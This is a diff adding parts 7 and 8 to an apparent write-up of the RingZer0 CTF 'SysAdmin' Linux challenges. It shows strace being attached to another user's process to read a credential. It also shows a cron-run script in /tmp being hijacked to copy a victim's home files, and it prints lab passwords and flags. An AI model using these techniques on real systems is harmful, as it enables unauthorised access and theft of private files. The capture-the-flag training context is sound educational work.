@@ -6,7 +6,7 @@ categories:
 tags: ringzer0ctf linux
 ---
 
-![](https://miro.medium.com/max/1472/1*5M1nixCj5FzRwBMVrU-EkQ.png)
+![](https://i.imgur.com/oLJ9KlD.png)
 
 You can find the challenges there > [ringzer0ctf](https://ringzer0ctf.com/challenges){:target="_blank"}
 
@@ -239,3 +239,112 @@ change my current password FLAG-314df4d411ae37f16f590f65da99f3b6
 We have the flag! `FLAG-314df4d411ae37f16f590f65da99f3b6`
 
 ## SysAdmin Part 7
+
+![](https://i.imgur.com/yY8QQ3j.png)
+
+Let's login as `neo:FLAG-314df4d411ae37f16f590f65da99f3b6` This is a bit tricky, if we run `ps` we can see that neo runs a binary `/bin/monitor`:
+
+```
+neo@lxc-sysadmin:~$ ps -f -u neo
+UID        PID  PPID  C STIME TTY          TIME CMD
+neo       4600  4598  0 Sep27 ?        00:00:00 /bin/monitor
+neo      16808 16803  0 12:00 pts/5    00:00:00 -su
+neo      20863 16808  0 13:18 pts/5    00:00:00 ps -f -u neo
+```
+
+I tried lot of stuff like `strings`,`ltrace` nothing but only `strace` works. If we use the path we will get perm error:
+
+```
+neo@lxc-sysadmin:~$ strace /bin/monitor
+execve("/bin/monitor", ["/bin/monitor"], [/* 11 vars */]) = -1 EACCES (Permission denied)
+write(2, "strace: exec: Permission denied\n", 32strace: exec: Permission denied
+```
+
+So we can use the PID:
+
+```
+neo@lxc-sysadmin:~$ strace -p 4600
+strace: Process 4600 attached
+restart_syscall(<... resuming interrupted nanosleep ...>) = 0
+write(-1, "telnet 127.0.0.1 23\n", 20)  = -1 EBADF (Bad file descriptor)
+write(-1, "user\n", 5)                  = -1 EBADF (Bad file descriptor)
+write(-1, "FLAG-a4UVY5HJQO5ddLc5wtBps48A3\n", 31) = -1 EBADF (Bad file descriptor)
+write(-1, "get-cpuinfo\n", 12)          = -1 EBADF (Bad file descriptor)
+```
+
+We got the flag! `FLAG-a4UVY5HJQO5ddLc5wtBps48A3`
+
+## SysAdmin Part 8
+
+![](https://i.imgur.com/018a7GX.png)
+
+Let's do the last one now, we have to login as `morpheus:VNZDDLq2x9qXCzVdABbR1HOtz` & get access to the cypher account. I did the `grep` again and i found some interesting files under `/backup`:
+
+```
+morpheus@lxc-sysadmin:~$ grep -ri "cypher" / 2>/dev/null
+..data..
+Binary file /backup/3dab3277410dddca016834f91d172027 matches
+Binary file /backup/ca584b15ae397a9ad45b1ff267b55796 matches
+Binary file /backup/776d27d2a429e63bbc3cb29183417bb2 matches
+```
+
+All are tar archives:
+
+```
+morpheus@lxc-sysadmin:/backup$ file *
+3dab3277410dddca016834f91d172027: POSIX tar archive (GNU)
+776d27d2a429e63bbc3cb29183417bb2: POSIX tar archive (GNU)
+c074fa6ec17bb35e168366c43cf4cd19: POSIX tar archive (GNU)
+ca584b15ae397a9ad45b1ff267b55796: POSIX tar archive (GNU)
+```
+
+Let's copy them under /tmp & use bash script magic to untar them fast!
+
+```
+morpheus@lxc-sysadmin:/backup$ cp -R /backup /tmp
+morpheus@lxc-sysadmin:/backup$ cd /tmp/backup
+morpheus@lxc-sysadmin:/tmp/backup$ for files in *; do tar -xvf "$files"; done
+var/log/syslog
+tmp/
+tmp/Gathering.py
+home/
+home/oracle/
+home/oracle/.vimrc
+home/oracle/.bash_history
+home/oracle/.ssh/
+home/oracle/.ssh/id_rsa
+home/oracle/.ssh/id_rsa.pub
+home/oracle/.ssh/authorized_keys
+home/oracle/.bash_logout
+home/oracle/.profile
+home/oracle/.bashrc
+var/spool/cron/
+var/spool/cron/atspool/
+var/spool/cron/crontabs/
+var/spool/cron/crontabs/cypher
+var/spool/cron/atjobs/
+var/spool/cron/atjobs/.SEQ
+```
+
+We can see an interesting cronjob:
+
+```
+morpheus@lxc-sysadmin:/tmp/backup$ cat var/spool/cron/crontabs/cypher
+..data..
+# m h  dom mon dow   command
+*/3 * * * * python /tmp/Gathering.py
+```
+
+This file runs every 3 minutes, let's edit it and make it to cat all files under cypher directory.
+
+```
+morpheus@lxc-sysadmin:/tmp/backup$ cat /tmp/Gathering.py
+import os
+os.system('cat /home/cypher/* > /tmp/pwned.txt')
+morpheus@lxc-sysadmin:/tmp$ cat pwned.txt | tail -1 | base64 -d
+FLAG-0cfc3390a082a22fdd763f4426f43296
+```
+
+The final flag! `FLAG-0cfc3390a082a22fdd763f4426f43296`
+
+Awesome challenges! :smile:
